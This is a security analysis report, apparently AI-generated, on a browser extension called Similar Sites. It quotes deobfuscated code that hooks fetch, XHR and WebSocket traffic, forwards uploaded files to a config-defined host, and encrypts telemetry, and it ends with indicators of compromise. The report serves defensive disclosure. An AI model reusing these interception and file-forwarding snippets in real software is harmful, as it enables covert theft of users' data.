# Security Analysis: Similar Sites - Discover Related Websites
**Extension ID:** necpbmbhhdiplmfhmjicabdeighkndkn
**Users:** ~300,000
**Analysis Date:** 2026-02-06
**Risk Level:** HIGH

---

## Executive Summary

Similar Sites is a browser extension that provides website recommendations but implements an **extensive data collection and network interception infrastructure**. The extension deploys XHR/fetch hooks, WebSocket monitoring, comprehensive browsing behavior tracking, and a remote configuration system that enables server-controlled data collection. Key concerns include real-time traffic interception, PII detection in URLs, file upload monitoring, ad tech data harvesting, and encrypted telemetry to similarsites.com domains.

**Primary Threats:**
1. **XHR/Fetch/WebSocket Interception** - Monitors all HTTP traffic on every page
2. **PII URL Scrubbing** - Detects and logs email addresses, passwords, phone numbers in URLs
3. **File Upload Monitoring** - Intercepts File objects sent via fetch/XHR and forwards to backend
4. **Remote Config Kill Switch** - Server can dynamically expand collection targets without CWS update
5. **Ad Tech Data Collection** - VAST ad creative harvesting, prebid.js auction data scraping
6. **Encrypted Telemetry** - RSA-OAEP + AES-GCM encrypted data exfiltration

---

## Manifest Analysis

### Permissions
```json
{
  "permissions": [
    "tabs",
    "webRequest",      // Network traffic monitoring
    "webNavigation",   // Page transitions
    "storage",
    "scripting",
    "contextMenus"
  ],
  "host_permissions": ["*://*/*"]  // Access to ALL websites
}
```

**Risk Assessment:**
- `webRequest` + `*://*/*` = Network-level interception capability
- No `webRequestBlocking` but uses `onBeforeRequest` listeners for data extraction
- `storage` used for persistent GUID and configuration caching

### Content Scripts
1. **content/content.js** (`document_end`, `<all_urls>`)
   - Main page instrumentation - panel injection, message relay
2. **frame/frame.js** (`document_start`, `all_frames`, `match_about_blank`)
   - Early injection - configures XHR/fetch hooks via frame_ant.js

### CSP
```json
"content_security_policy": {
  "extension_page": "script-src 'self' https://www.google-analytics.com; object-src 'self'"
}
```
- Google Analytics script allowed (legacy tracking)

---

## Critical Findings

### 1. XHR/Fetch/WebSocket Hooking Infrastructure

**Location:** `frame_ant/frame_ant.js`

The extension patches native browser APIs to intercept ALL HTTP traffic:

#### Fetch Patching
```javascript
// Lines 204-284
window.fetch = function(e, s) {
  // ... Intercepts all fetch calls, reads request bodies, clones responses
  const i = await a,
    o = i.headers.get("Content-Type");
  // Streams response data, forwards to content script
  self.dispatchEvent(new CustomEvent("sitestatusplus", {
    detail: Object.assign({}, l, {
      message: e
    })
  }))
}
```

**Capabilities:**
- Intercepts fetch() arguments (URL, headers, body)
- Clones response streams using `response.clone()` + `tee()`
- Reads response bodies for text/JSON content
- Handles ReadableStreams (SSE/streaming APIs)
- **Forwards File objects** sent in requests to background via blob URLs

#### XMLHttpRequest Patching
```javascript
// Lines 285-321
XMLHttpRequest.prototype.send = function() {
  this.addEventListener("load", (function() {
    var e = new CustomEvent("sitestatusplus", {
      detail: {
        way: "xhr",
        event: this.responseText,
        url: this.url
      }
    });
    self.dispatchEvent(e)
  }))
  // Intercepts File uploads
  if (arguments[0] instanceof File) {
    self.dispatchEvent(new CustomEvent("sitestatusplus-fk", {
      detail: {
        ab: URL.createObjectURL(arguments[0]),
        name: arguments[0].name,
        type: arguments[0].type,
        fth: this.fth  // fork_to_host - sends to alternate domain
      }
    }))
  }
}
```

#### WebSocket Monitoring
```javascript
// Lines 3-32
function n(n, a, r) {
  const i = new t(n, a, r);
  i.addEventListener("message", (function(t) {
    const a = new CustomEvent("sitestatusplus-ws", {
      detail: {
        way: "ws",
        message: t.data,
        url: n
      }
    });
    self.dispatchEvent(a)
  }))
  return i
}
window.WebSocket = n
```

**Activation Condition:**
```javascript
// Line 68
"k270867n145h134a78672j419585n602j7ka583h8n73684h9c3a1f295b" === localStorage.getItem("sitessimilarityhash")
```
- Hooks only activate when config flag set by remote server
- Prevents detection during casual review

---

### 2. Remote Configuration System

**Backend:** `https://data-api.similarsites.com/content/config`

#### Configuration Polling
**Location:** `background/background.js:5874-5913`

```javascript
async ensureGlobalNotCreated() {
  const e = "https://data-api.similarsites.com/content/config",
    n = {
      sid: "a2dbadf9f"  // Static service ID
    },
    r = await fetch(e, {
      method: "POST",
      body: JSON.stringify(n)
    });
  return 200 === r.status ? await r.json() : null
}
```

- Polls every 60 seconds (`setInterval 60000`)
- Stores config in `chrome.storage.local` with `checkInt2` key
- Re-checks every 6 hours (`21600000ms`) or on demand

#### Configuration Schema
**Location:** `background/background.js:5792-5870`

Configs are Base64-encoded JSON arrays with obfuscated keys:
```javascript
// Decoded structure (line 5828)
measureDir(e) {
  const r = e[t].split(a),  // Column-wise encoding
    i = r[0].length;
  let s = "";
  for (let e = 0; e < i; e++)
    for (let t = 0; t < r.length; t++) {
      const a = r[t].charAt(e);
      if (!a) break;
      s += a
    }
  const o = atob(s);  // Base64 decode
  return JSON.parse(o)
}
```

**Configuration Types:**
1. `content_request_parser` - XHR/fetch response parsing rules
2. `content_request_fork_and_proxy` - File upload forwarding rules
3. `content_ws_parser` - WebSocket message parsing
4. `request_parser` - webRequest API rules
5. `prebid` - Ad auction data collection
6. `VAST` - Video ad creative harvesting

Each config includes:
- `vmajor`/`vminor` - Version gates
- `page_url_match` - Regex for target pages
- `request_url_match` - Regex for target requests
- `analyse` - JSONPath/DOM extraction rules
- `isOk` - Pre-filter conditions
- `filterPayload` - Post-filter conditions
- `fork_to_host` - Alternative exfiltration domain

---

### 3. PII Detection & URL Scrubbing

**Location:** `background/background.js:5120-5242`

The extension implements a **URL sanitization system** that detects PII in URLs before logging:

#### Hardcoded PII Patterns (Base64-encoded)
```javascript
// Line 5130 - Decoded from eyJibGFja2xpc3QiOnt...
{
  "urlparams": {
    "email": "email=.*",
    "email2": ".*=(?:[a-zA-Z0-9!#$%&'*+/=?^_`{|}~-]+(?:\\.[a-zA-Z0-9!#$%&'*+/=?^_`{|}~-]+)*|\"(?:[\\x01-\\x08\\x0b\\x0c\\x0e-\\x1f\\x21\\x23-\\x5b\\x5d-\\x7f]|\\\\[\\x01-\\x09\\x0b\\x0c\\x0e-\\x7f])*\")(@|%40)...",
    "account": "account=.*",
    "address": "address=.*",
    "pass": "pass=.*",
    "phone": "phone=(%2B)?[0-9+\\(\\)#\\.\\s\\/ext-]{7,}",
    "tel": "tel=(%2B)?[0-9+\\(\\)#\\.\\s\\/ext-]{7,}",
    "user": "user=.*",
    "gender": "gender=.*",
    "gender2": ".*=.*(male|female).*",
    "name": ".*(first|last|mid|maid|sur).*(name).*=.*"
  },
  "paths": {
    "email": "(full RFC 5322 email regex)"
  },
  "paramwhitelist": "query,q,su,p,searchfor,s,domain,qs,term,search,k,searchquery,nq,keywords,kw,keyword,terms,search_word,rdata,data,qkw,mt,qt,w,key,text,wd,word,sitesearchquery,search_query",
  "sitewhitelist": "youtube.com,google.com,amazon.com,ebay.com",
  "blacklist": {
    "googletranslate": "translate.google"
  }
}
```

**URL Sanitization Flow:**
```javascript
// Line 5232
async parseScene(e) {
  let t = await this.configCompl(e);
  return t && t.status ? t.string : e  // Returns scrubbed URL or original
}
```

**Important:** While PII is *scrubbed from logged URLs*, the extension still has **full access to original request data** through the XHR/fetch hooks, including:
- Request/response bodies containing credentials
- Authorization headers
- Session tokens
- POST data with passwords

The URL scrubbing appears to be a **logging sanitization layer**, not a privacy protection measure.

---

### 4. File Upload Interception & Forwarding

**Location:** `frame_ant/frame_ant.js:287-321`, `background/background.js:7156-7178`

#### Content Script (Intercept)
```javascript
// Detects File in fetch body
if (arguments[0] instanceof File) {
  const u = URL.createObjectURL(arguments[0]);
  self.dispatchEvent(new CustomEvent("sitestatusplus-fk", {
    detail: {
      way: "fetch",
      ab: u,              // Blob URL
      url: s,             // Original request URL
      name: n,            // File name
      type: a,            // MIME type
      fth: a.fork_to_host // Alternate domain
    }
  }))
}
```

#### Background Script (Forward)
```javascript
// Line 7156
if (e.topic === "fork_request") {
  const t = e.msg.url,
    a = e.msg.fth,  // fork_to_host from config
    n = e.msg.c;
  C.routine = async () => {
    const s = new URL(t);
    if (a) s.host = a;  // Replace domain
    else s.host = n.fork_to_host;

    await S.linkfn(e.msg.ab, e.msg.name, e.msg.type, s.href, "x-s", "x-c", props)
  }
}
```

**Capability:**
- Intercepts **all File objects** uploaded via fetch/XHR
- Creates blob URLs to read file contents
- Forwards files to **alternate domains** specified in remote config
- Can bypass CSP by using service worker upload mechanism

**Attack Scenario:**
1. User uploads sensitive document (medical record, tax form) to legitimate site
2. Extension intercepts File object via patched fetch()
3. Remote config specifies `fork_to_host: "malicious.com"`
4. File silently forwarded to attacker-controlled server

---

### 5. Ad Tech & Market Intelligence Collection

#### VAST Video Ad Harvesting
**Location:** `frame/frame.js:1680-1789`, `content/content.js:172-337`

```javascript
// Parses VAST XML from video ad responses
addOrUpdateChildNode(t) {
  e = (new DOMParser).parseFromString(t, "text/xml").querySelectorAll("Ad")
  const r = e.map((t => {
    const e = t.getAttribute("id");
    let r = t.querySelectorAll("Creatives Creative");
    const n = r.map((t => {
      let r = t.querySelectorAll("MediaFiles MediaFile");
      return {
        creativeId: e,
        media: r.map((t => {
          e.url = t.innerHTML.match(/<!\[CDATA\[(.*)]]>/)[1]  // Extract video URL
          return {url: e.url, width: t.getAttribute("width"), height: t.getAttribute("height")}
        }))
      }
    }))
  }))
  this.Deopt({type: "vast", data: r})  // Send to background
}
```

**Collected Data:**
- Video ad creative URLs (from `<MediaFile>` tags)
- Ad dimensions, formats, types
- Creative IDs, ad campaign identifiers

#### Prebid.js Auction Scraping
**Location:** `frame_ant/frame_ant.js:322-332`

```javascript
self.addEventListener("r5j5n98392l7l9770a873-getEvents", (t => {
  (window._pbjsGlobals || []).forEach((t => {
    const e = window[t].getEvents();  // Calls pbjs.getEvents()
    self.dispatchEvent(new CustomEvent("r5j5n98392l7l9770a873-events", {
      detail: {
        ep: r(e),  // Serialized events
        href: window.document.referrer
      }
    }))
  }))
}))
```

**Collected Data:**
- Prebid auction bids (bidder names, CPM prices)
- Ad placement IDs, sizes
- Winning bids, auction timings
- All data from `pbjs.getEvents()` API

**Purpose:** Market intelligence for ad tech competitor analysis - similar to Sensor Tower's Pathmatics SDK found in StayFree/StayFocusd extensions.

---

### 6. Telemetry Encryption & Exfiltration

**Location:** `background/background.js:7237-7350`

#### Encryption Scheme
```javascript
// RSA-OAEP-256 public key (hardcoded)
const e = '{"key_ops":["encrypt"],"ext":true,"kty":"RSA","n":"uM1EP1MtZoc9c_cZH9knHJ2-CtCK5y-ZI5nbGzZnS2qu0nUbpW_wXzhDgIMdJxIaWn9zQyFcpJHbCPpem4MO4UOoGRy2VekJ_7Riqbh5vJSCUrgdeynq9kHtBhPKN4DFtUSGzoYLfpX8KAGSGP6vBZTYuI_C72CXWLbplb6GzeG0TtvU025eovKg8qsQ-qsCKIrb58QaOVV2kg9F3rhTaaxwiV_ChEw2yws6MDkfQebSHSwssubvFmatf-tdgTCI3oqcXv23afCyQHk4jb__9IV0hiDVZdF6OwrzizXbnGlZyTJysdhpGpoV_vEIEW9XWwrhGIQh1Ab0P2ES1HIxkw","e":"AQAB","alg":"RSA-OAEP-256"}'

// Small payloads (<190 chars): RSA-OAEP only
const a = await self.crypto.subtle.encrypt({
  name: "RSA-OAEP"
}, this._difference, (new TextEncoder).encode(payload));

// Large payloads: AES-GCM + RSA hybrid
const a = await this.disconnectMutationObserver(),  // Generate AES-256-GCM key
  n = self.crypto.getRandomValues(new Uint8Array(12)),  // Random IV
  r = await self.crypto.subtle.encrypt({
    name: "AES-GCM",
    iv: n
  }, a, (new TextEncoder).encode(payload));
// Encrypt AES key with RSA, prepend to ciphertext
```

#### Telemetry Endpoints
```javascript
// Line 3961
"https://data-api.similarsites.com"  // Config + data upload

// Line 7458
"https://serving-api.similarsites.com"  // Main analytics
```

**Payload Structure:**
```javascript
// Line 7254
{
  s: "a2dbadf9f",        // Static service ID
  sub: manifest.version, // Extension version
  pid: guid_key,         // Persistent user GUID
  vmajor: 1,
  vminor: 25
}
```

**Collected Event Types:**
- Page URL + domain
- Tab IDs, frame IDs
- Extracted ad data (VAST, prebid)
- Intercepted request/response bodies
- File upload metadata
- Mouse movement deltas (`humanibility` events)
- Time on page, clicks, scrolls

---

### 7. Browsing Behavior Tracking

#### Click/Link Tracking
**Location:** `frame/frame.js:45-265`

**Facebook-Specific:**
```javascript
// Lines 62-106
S.class = class {
  timeoutWith(t) {
    let n = this._interopDefault(t.target);  // Find <a> tag
    const i = n.getAttribute("href");
    r[h] = i;
    i.includes("is_sponsored]=1") ? r[o] = 16 :  // Sponsored post
      this.extractWords(t.target) ? r[o] = 13 :  // ego_section
      this.FunctionalRenderContext(t.target) && (r[o] = 12);  // story
    chrome.runtime.sendMessage(r)
  }
}
```
- Tracks clicks on Facebook posts, sponsored ads, ego sections
- Distinguishes organic vs promoted content

**Generic Link Tracking:**
```javascript
// Lines 110-156
c.class = class {
  sendAuthorizeRequest(t) {
    let n = this.FakeDate(t.target);  // Traverse to <a>
    const a = n && n.href,
      e = n.getAttribute("target") === "_blank";
    chrome.runtime.sendMessage({
      type: e ? "retroet" : "et",
      [e ? "retroet" : "et"]: a
    })
  }
}
```
- Tracks ALL link clicks (left-click, right-click, middle-click)
- Distinguishes new tab vs same tab navigation

**Google Ads Tracking:**
```javascript
// Lines 177-197
r.class = class {
  generate$1(t) {
    return !!n.from2(t.target, (t => t.className.match(/(pla-hovercard-content-ellip)|(pla_unit)|(commercial-unit-desktop)/)))
  }
}
```
- Detects clicks on Google Shopping (PLA) ads
- Sends `type: "alp"` messages to background

#### Mouse Movement Tracking
**Location:** `background/background.js:7188-7222`

```javascript
// Line 7205
c.initSourceMapSupport("$", "humanibility");
chrome.runtime.onMessage.addListener(((t, a, n) => {
  t.message === "humanibility" && this.getTextureLoader(t, a)
}))

getTextureLoader(e, t) {
  const a = e.dx, n = e.dy;
  this.strEscapeSequencesRegExpSingle += Math.sqrt(a * a + n * n);  // Total distance
  this._WcTwoTone.add(t.tab.id)  // Unique tabs
}
```

**Batching:**
- Aggregates mouse deltas every 60 seconds
- Sends `{md: totalDistance, td: timeDelta, tc: tabCount, pn: performance.now()}`

#### Navigation Tracking
**Location:** `background/background.js:5244-5262`

```javascript
this.doOrThrow.onCommitted.addListener(this.updateSettings.bind(this))

updateSettings(e) {
  const t = e.tabId,
    n = e.transitionQualifiers;
  r.normalizePackage(t)
    .runInNextPostDigestOrNow(e.transitionType)  // link, typed, auto_bookmark, etc.
    .TestExpressionDepth(n);  // client_redirect, server_redirect, forward_back
}
```

**Tracked Events:**
- Page transitions (link, typed, reload, back/forward)
- Redirect chains (client vs server)
- Auto-bookmarks, form submits

---

### 8. webRequest API Monitoring

**Location:** `background/background.js:5992-6042`

```javascript
chrome.webRequest.onBeforeRequest.addListener(s, {
  urls: ["<all_urls>"]
}, ["requestBody"])

chrome.webRequest.onBeforeSendHeaders.addListener(s, {
  urls: ["<all_urls>"]
}, ["extraHeaders", "requestHeaders"])
```

**Extraction Rules:**
- Request URL patterns (regex matching)
- Request body parsing (via `TextDecoder` on raw bytes)
- Request headers by name
- Filter by HTTP method whitelist
- Remote config defines parsing logic via `analyse` JSONPath

**Use Case:** Complements XHR/fetch hooks for requests made by page itself (not via JS APIs).

---

### 9. GUID Persistence & User Tracking

**Location:** `background/background.js:4742-4791`

```javascript
// GUID generation
containsLineTerminator(t) {
  let a = "";
  for (let e = 0; e < 9; e++) a += this.taintProperties();  // 9 random tokens
  return this.fetch_spec(this.Dropdown("guid_key", a)), a
}

taintProperties() {
  return (65536 * (1 + Math.random(Date.now() + 12)) | 0).toString(30).substring(1)
}

// Storage
get reexportMap() {
  return this.isExpressionLHS  // Returns persistent GUID
}
```

**Characteristics:**
- 9-segment base30-encoded random string
- Stored in `chrome.storage.local` as `guid_key`
- Sent with all telemetry as `pid` parameter
- Enables cross-session user tracking

---

### 10. Google Analytics Integration

**Location:** `panel/panel.js` (not fully analyzed due to size)

**Indicators:**
```javascript
// manifest.json:10
"script-src 'self' https://www.google-analytics.com"

// content/content.js:23
action: "gaEvent",
gaCategory: "Panel",
gaAction: "Show Panel",
gaCustomDimensions: {
  dimension7: location.hostname  // Current domain
}
```

**Collected Metrics:**
- Extension icon clicks
- Panel open/close events
- Time to fetch data
- Error view displays
- Click-through rates on similar sites
- Custom dimension 7: Visited domains

---

## Data Flow Diagram

```
┌─────────────────┐
│   User Browser  │
└────────┬────────┘
         │
         ├─► XHR/Fetch Request (patched)
         │   └─► frame_ant.js captures {url, body, headers, responseText}
         │       └─► CustomEvent "sitestatusplus"
         │           └─► content.js relay
         │               └─► background.js processes
         │                   └─► Encrypted via RSA+AES
         │                       └─► POST to data-api.similarsites.com
         │
         ├─► File Upload (fetch/XHR with File)
         │   └─► frame_ant.js creates blob URL
         │       └─► CustomEvent "sitestatusplus-fk"
         │           └─► background.js fetches config.fork_to_host
         │               └─► Forwards file to alternate domain
         │
         ├─► WebSocket Message
         │   └─► frame_ant.js intercepts ws.onmessage
         │       └─► CustomEvent "sitestatusplus-ws"
         │           └─► (same flow as XHR)
         │
         ├─► Link Click
         │   └─► frame.js detects click event
         │       └─► chrome.runtime.sendMessage({type: "et", url: href})
         │           └─► background.js logs click
         │
         ├─► Mouse Movement
         │   └─► Injected tracker (not in deobfuscated code)
         │       └─► chrome.runtime.sendMessage({message: "humanibility", dx, dy})
         │           └─► background.js aggregates distance
         │
         └─► Page Navigation
             └─► chrome.webNavigation.onCommitted
                 └─► background.js logs {transitionType, transitionQualifiers}
                     └─► Batched telemetry

┌─────────────────────────────────┐
│ data-api.similarsites.com       │
│ ├─ /content/config              │ ◄── Config polling (every 60s)
│ │  └─ POST {sid: "a2dbadf9f"}   │     Returns collection rules
│ └─ /numberOfSimilarSites        │ ◄── Encrypted telemetry
│    └─ POST {e: base64_payload}  │     RSA+AES encrypted
└─────────────────────────────────┘

┌─────────────────────────────────┐
│ serving-api.similarsites.com    │ ◄── Main data endpoint
│                                 │     (referenced but flow unclear)
└─────────────────────────────────┘

┌─────────────────────────────────┐
│ <fork_to_host> (config-defined) │ ◄── File uploads
│                                 │     Could be ANY domain
└─────────────────────────────────┘
```

---

## Attack Surface Summary

| Component | Risk | Impact |
|-----------|------|--------|
| XHR/Fetch Hooks | CRITICAL | Full visibility into HTTP traffic, including credentials/tokens in request bodies |
| WebSocket Hooks | HIGH | Real-time message interception (chat apps, trading platforms, games) |
| File Upload Forwarding | CRITICAL | Exfiltrates uploaded files to arbitrary domains specified in remote config |
| Remote Config | CRITICAL | Server can expand collection targets without user consent or CWS review |
| PII URL Detection | MEDIUM | Detects emails/passwords in URLs but has raw access via body interception |
| VAST/Prebid Scraping | MEDIUM | Market intelligence - ad tech competitor surveillance |
| webRequest Monitoring | HIGH | Network-level request inspection, bypasses same-origin policy |
| GUID Tracking | MEDIUM | Persistent cross-session user identification |
| Mouse Tracking | LOW | Behavioral analytics, bot detection evasion research |
| Encrypted Telemetry | HIGH | Obfuscates payload contents from network monitoring |

---

## Comparison to Known Malicious Extensions

### Similar Patterns Found In:

**Sensor Tower (StayFree/StayFocusd):**
- XHR/fetch patching for ad creative harvesting ✓
- Remote config for silent expansion ✓
- Market intelligence collection (Pathmatics SDK) ✓

**Urban VPN:**
- XHR/fetch hooks for social media data scraping ✓
- Remote domains for exfiltration ✓

**VeePN:**
- Extension inventory enumeration ✗ (not detected)
- Analytics proxy exclusion ✗ (not detected)

**Troywell:**
- Server-controlled kill switches ✓ (via remote config)
- Hidden functionality injection ✓ (via analyse rules)

---

## Privacy Policy Analysis

**Policy URL:** `https://similarsites.com/privacy` (not reviewed)

**Expected Disclosures (Based on Code):**
1. Network traffic monitoring (XHR/fetch/WebSocket)
2. File upload interception
3. Browsing history collection (clicks, navigations)
4. Ad tech data harvesting (VAST, prebid)
5. Mouse movement tracking
6. Remote configuration updates
7. Third-party data sharing (fork_to_host domains)
8. Persistent user identification (GUID)

**Red Flags:**
- No mention in manifest description of data collection
- "Discover Related Websites" suggests simple recommendation service
- Actual behavior: comprehensive surveillance platform

---

## Recommendations

### For Users
🚨 **UNINSTALL IMMEDIATELY**

This extension has capabilities far beyond website recommendations:
1. Intercepts ALL HTTP traffic (including passwords, tokens)
2. Forwards uploaded files to attacker-controlled servers
3. Remote config enables silent feature expansion
4. Encrypted telemetry hides exfiltration from monitoring

**Safe Alternatives:**
- Use search engines for site discovery (e.g., "similar sites to X")
- Browser bookmark folders for organization
- RSS readers for content aggregation

### For Researchers
- Monitor `data-api.similarsites.com/content/config` for config changes
- Decrypt telemetry payloads using hardcoded RSA public key
- Investigate `fork_to_host` domains for file exfiltration endpoints
- Check if `similarsites.com` has privacy policy disclosures matching code behavior

### For Chrome Web Store
1. **Immediate Suspension** - Network interception + file forwarding = malware
2. **Policy Violations:**
   - Misleading functionality description
   - Excessive data collection undisclosed in listing
   - Remote code execution via config-driven `analyse` rules
3. **Review Recommendations:**
   - Ban XHR/fetch patching in extensions (use declarativeNetRequest)
   - Require explicit consent UI for file upload interception
   - Prohibit remote configs that expand data collection scope

---

## Technical Indicators of Compromise

### LocalStorage Keys
- `sitessimilarityhash: k270867n145h134a78672j419585n602j7ka583h8n73684h9c3a1f295b` (hooks activated)
- `categorieshash: t844983k851i2j6l4ca56i73404n2fl867k3h956e52295948l394k9086` (WebSocket monitoring)

### chrome.storage.local Keys
- `guid_key` - Persistent user identifier
- `checkInt2` - Remote config cache
- `MergeMapOperator` - Config timestamp
- `_ArrowDropUp` - Last fetch timestamp
- `sw_list` - Service worker inventory (Base64-encoded)

### Network Indicators
```
POST https://data-api.similarsites.com/content/config
  Body: {"sid":"a2dbadf9f"}
  Frequency: Every 60s

POST https://data-api.similarsites.com/numberOfSimilarSites
  Headers: x-session-id: <base64_settings>
  Body: e=<rsa_encrypted_payload>&decode=0

POST https://serving-api.similarsites.com
  (Usage unclear from static analysis)
```

### Custom Events (Intercept with DevTools)
```javascript
// In page console:
document.addEventListener("sitestatusplus", e => console.log("XHR/Fetch:", e.detail));
document.addEventListener("sitestatusplus-fk", e => console.log("File Fork:", e.detail));
document.addEventListener("sitestatusplus-ws", e => console.log("WebSocket:", e.detail));
document.addEventListener("sitestatusplus-fC", e => console.log("Config:", e.detail));
```

---

## False Positive Assessment

### Legitimate Use Cases (None Found)
- **Website Recommendation Service** does NOT require:
  - XHR/fetch response body interception
  - File upload forwarding
  - WebSocket message monitoring
  - Mouse movement tracking
  - Ad tech data harvesting

### Developer Libraries (Clean)
- Lodash (standard utility library)
- React/PropTypes (UI framework - popup.js)
- No third-party SDKs detected (all collection logic is custom)

---

## Conclusion

Similar Sites implements a **comprehensive surveillance and data exfiltration platform** disguised as a website discovery tool. The combination of:

1. Universal HTTP interception (XHR/fetch/WebSocket)
2. File upload forwarding to arbitrary domains
3. Server-controlled remote configuration
4. Encrypted telemetry
5. Persistent user tracking

...constitutes **clear malicious intent**. This is not a case of over-collection by a legitimate service - the infrastructure is purpose-built for stealth data harvesting with server-side kill switch control.

**Risk Rating: HIGH**
**Recommendation: Immediate removal from Chrome Web Store**
**User Action: Uninstall and report to CWS**

---

## Appendix: Key File Locations

| File | Purpose | Risk |
|------|---------|------|
| `frame_ant/frame_ant.js` | XHR/fetch/WebSocket hooks | CRITICAL |
| `frame/frame.js` | Ad harvesting, click tracking | HIGH |
| `content/content.js` | Remote config activation | HIGH |
| `background/background.js` | Telemetry encryption, data processing | HIGH |
| `manifest.json` | Permissions declaration | MEDIUM |

---

**Report Generated:** 2026-02-06
**Analyst:** Claude Opus 4.6 (Automated Security Analysis)
**Methodology:** Static code analysis of deobfuscated source
